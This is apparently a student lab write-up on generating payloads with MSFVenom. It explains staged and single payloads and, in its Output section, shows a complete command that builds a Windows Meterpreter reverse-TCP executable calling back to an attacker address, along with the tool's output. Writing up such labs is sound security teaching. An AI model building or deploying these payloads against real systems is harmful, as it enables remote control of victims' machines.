# Experiment 20: Payload Generation Using MSFVenom

## Aim
To study and understand the mechanics of payload generation, parameter configurations, and binary formats using MSFVenom for educational and security assessment purposes.

## Theory
`msfvenom` is the standalone payload generation tool within the Metasploit Framework. It produces custom payloads targeting specific operating systems and processor architectures.
* **Payload Types:**
  * **Singles / Inline:** Self-contained payloads that execute without secondary stages (e.g., executing a command or adding a local administrator).
  * **Stagers:** Lightweight code designed to set up a network connection back to the attacking machine and download the larger stage payload.
  * **Stages:** Complex payloads downloaded by stagers (e.g., Meterpreter).
* **Common Command Structure:**
  `msfvenom -p <payload_name> LHOST=<attacker_ip> LPORT=<port> -f <format> > <output_file>`

## Procedure
1. Open the Kali Linux Terminal.
2. Formulate the required payload configuration parameters:
   * Target OS: Windows
   * Architecture: x86 / x64
   * Mechanism: Reverse TCP connection
3. Inspect format options using `msfvenom --help-formats`.
4. Review generated executable structure and defensive detection mechanisms.

## Output
```text
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
```

## Result
Successfully studied and analyzed payload generation concepts using MSFVenom.
